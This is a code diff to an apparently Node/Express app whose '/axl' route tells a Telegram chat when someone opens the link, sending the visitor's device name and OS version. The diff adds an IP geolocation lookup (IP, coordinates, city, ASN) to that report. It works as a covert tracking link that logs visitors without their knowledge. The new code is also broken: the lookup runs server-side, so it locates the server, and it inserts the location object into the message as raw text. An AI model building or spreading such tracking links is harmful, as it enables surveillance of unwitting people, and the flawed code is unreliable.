@@ -79,7 +79,41 @@ function getOSVersion(userAgent) {
   const osVersion = (userAgent.match(/(iPhone|iPad|iPod|Android|Windows|Macintosh)\s([0-9._]+)/) || [])[2];
   return osVersion || "Unknown";
 }
-// Function to get battery information
+
+async function getUserLocation() {
+  try {
+    const response = await axios.get("https://ipapi.co/json/");
+    const data = response.data;
+    return {
+      ip: data.ip, // Extract IP
+      location: {
+        latitude: data.latitude,
+        longitude: data.longitude,
+        region: data.region,
+        city: data.city,
+        country: data.country_name,
+        countryCode: data.country_code,
+        asn: data.asn,
+      }
+    };
+    } catch (error) {
+    console.error('Error fetching IP data:', error);
+    return {
+      ip: 'N/A',
+      location: {
+        latitude: 'N/A',
+        longitude: 'N/A',
+        region: 'N/A',
+        city: 'N/A',
+        country: 'N/A',
+        countryCode: 'N/A',
+        asn: 'N/A',
+      }
+    };
+  }
+}
+
+
 
 
 
@@ -95,11 +129,13 @@ app.get('/axl' , async (req, res) => {
   const batteryInfo = getBatteryInfo();
   */// Send a message to your Telegram ID with the detected device name
 const androos = getOSVersion(userAgent);
- 
+const userLoc = await getUserLocation();
+     
  const tmsg = `Someone accessed the URL 
 
 D:- ${deviceName}
-V:-  ${androos}`;
+V:- ${androos}
+L:- ${userLoc}`;
  
  
   bot.sendMessage(ajsal, tmsg);
